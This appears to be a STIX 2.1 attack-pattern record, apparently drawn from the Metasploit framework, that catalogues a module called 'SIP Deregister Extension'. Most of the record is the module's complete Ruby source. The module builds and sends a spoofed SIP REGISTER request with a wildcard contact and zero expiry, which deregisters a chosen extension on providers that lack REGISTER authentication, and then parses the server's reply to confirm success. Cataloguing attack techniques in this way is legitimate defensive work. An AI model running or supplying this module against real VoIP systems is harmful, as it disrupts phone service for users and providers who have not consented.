{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--88c46dac-f57c-46c0-98f0-4f147965a210",
    "created": "2024-08-14T16:31:23.733357Z",
    "modified": "2024-08-14T16:31:23.733361Z",
    "name": "SIP Deregister Extension",
    "description": " This module will attempt to deregister a SIP user from the provider. It has been tested successfully when the sip provider/server doesn't use REGISTER authentication. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/voip/sip_deregister.rb",
            "external_id": "sip_deregister.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'SIP Deregister Extension',\n      'Description'   => %q{\n          This module will attempt to deregister a SIP user from the provider. It\n        has been tested successfully when the sip provider/server doesn't use REGISTER\n        authentication.\n      },\n      'Author'         => [ 'ChrisJohnRiley' ],\n      'License'        =>  MSF_LICENSE\n    )\n\n    deregister_udp_options\n    register_options(\n      [\n        Opt::RPORT(5060),\n        OptString.new('SRCADDR', [true, \"The sip address the spoofed deregister request is coming from\",'192.168.1.1']),\n        OptString.new('EXTENSION', [true, \"The specific extension or name to target\", '100']),\n        OptString.new('DOMAIN', [true, \"Use a specific SIP domain\", 'example.com'])\n      ])\n    register_advanced_options(\n      [\n        OptAddress.new('SIP_PROXY_NAME', [false, \"Use a specific SIP proxy\", nil]),\n        OptPort.new('SIP_PROXY_PORT', [false, \"SIP Proxy port to use\", 5060])\n      ])\n  end\n\n\n  def setup\n    # throw argument error if extension or domain contain spaces\n    if datastore['EXTENSION'].match(/\\s/)\n      raise ArgumentError, \"EXTENSION cannot contain spaces\"\n    elsif datastore['DOMAIN'].match(/\\s/)\n      raise ArgumentError, \"DOMAIN cannot contain spaces\"\n    end\n  end\n\n  def run_host(ip)\n\n    begin\n\n      src = datastore['SRCADDR']\n      ext = datastore['EXTENSION']\n      dom = datastore['DOMAIN']\n      sphost = datastore['SIP_PROXY_NAME']\n      spport = datastore['SIP_PROXY_PORT'] || 5060\n      conn_string = \"#{ext}@#{dom}\"\n\n      # set Route header if SIP_PROXY is set\n      if not sphost.nil? and not sphost.empty?\n        route = \"Route: <sip:#{sphost}:#{spport};lr>\\r\\n\"\n      end\n\n      connect_udp\n\n      print_status(\"Sending deregistration packet to: #{conn_string}\")\n      print_status(\"Using SIP proxy #{sphost}:#{spport}\") if route\n\n      req =  \"REGISTER sip:#{dom} SIP/2.0\" + \"\\r\\n\"\n      req << route if route\n      req << \"Via: SIP/2.0/UDP #{src}\" + \"\\r\\n\"\n      req << \"Max-Forwards: 70\" +  \"\\r\\n\"\n      req << \"To: \\\"#{ext}\\\"<sip:#{conn_string}>\" + \"\\r\\n\"\n      req << \"From: \\\"#{ext}\\\"<sip:#{conn_string}>\" + \"\\r\\n\"\n      req << \"Call-ID: #{(rand(100)+100)}#{ip}\" + \"\\r\\n\"\n      req << \"CSeq: 1 REGISTER\" + \"\\r\\n\"\n      req << \"Contact: *\" + \"\\r\\n\"\n      req << \"Expires: 0\" + \"\\r\\n\"\n      req << \"Content-Length: 0\" + \"\\r\\n\\r\\n\"\n\n      udp_sock.put(req)\n      response = false\n\n      while (r = udp_sock.recvfrom(65535, 3) and r[1])\n        response = parse_reply(r)\n      end\n\n      # print error information if no response has been received\n      # may be expected if spoofing the SRCADDR\n      print_error(\"No response received from remote host\") if not response\n\n    rescue Errno::EACCES\n    ensure\n      disconnect_udp\n    end\n\n  end\n\n  def parse_reply(pkt)\n    # parse response to check if the ext was successfully de-registered\n\n    if(pkt[1] =~ /^::ffff:/)\n      pkt[1] = pkt[1].sub(/^::ffff:/, '')\n    end\n\n    resp  = pkt[0].split(/\\s+/)[1]\n    rhost,rport = pkt[1], pkt[2]\n\n    if(pkt[0] =~ /^To\\:\\s*(.*)$/i)\n      testn = \"#{$1.strip}\".split(';')[0]\n    end\n\n    case resp.to_i\n    when 401\n      print_error(\"Unable to de-register #{testn} [401 Unauthorised]\")\n    when 403\n      print_error(\"Unable to de-register #{testn} [403 Forbidden]\")\n    when 200\n      print_good(\"#{testn} de-registered [200 OK]\")\n    else\n      print_error(\"#{testn} : Undefined error code #{resp.to_i}\")\n    end\n\n    return true # set response to true\n  end\nend\n"
}